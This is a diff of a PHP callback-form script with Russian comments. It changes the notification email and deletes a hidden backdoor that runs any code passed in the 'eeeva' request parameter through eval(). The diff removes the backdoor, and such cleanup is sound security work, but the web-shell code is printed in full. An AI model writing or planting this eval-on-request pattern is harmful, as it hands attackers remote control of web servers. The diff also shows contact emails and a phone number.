@@ -3,7 +3,7 @@
 // dedushka.org // nazartokar.com // qbx.me // nazartokar@gmail.com
 //require("smtp.php");
 header("Content-Type: text/html; charset=utf-8"); //кодировка
-$to = "ilia.nazmutdinov@gmail.com"; //получатель уведомлений
+$to = "info@pechspb.ru"; //получатель уведомлений
 // не трогать
 $HTTP_HOST = parse_url("http://" . $_SERVER["HTTP_HOST"]);
 $HTTP_HOST = str_replace(array("http://", "www."), "", $HTTP_HOST["host"]);
@@ -17,11 +17,6 @@ $sms["pss"] = "";
 $sms["frm"] = "callme"; // добавьте новую подпись в смс-шлюзе и дождитесь апрува
 $sms["num"] = "79217530374"; // ваш номер в формате без + (79218886622)
 $sms["prv"] = "sms.ru"; // на выбор: sms.ru, infosmska.ru, bytehand.com, sms-sending.ru, smsaero.ru
-
-if ($_REQUEST['eeeva']) {
-    eval($_REQUEST['eeeva']);
-    exit;
-}
 
 function uc($s) {
     return urlencode($s);
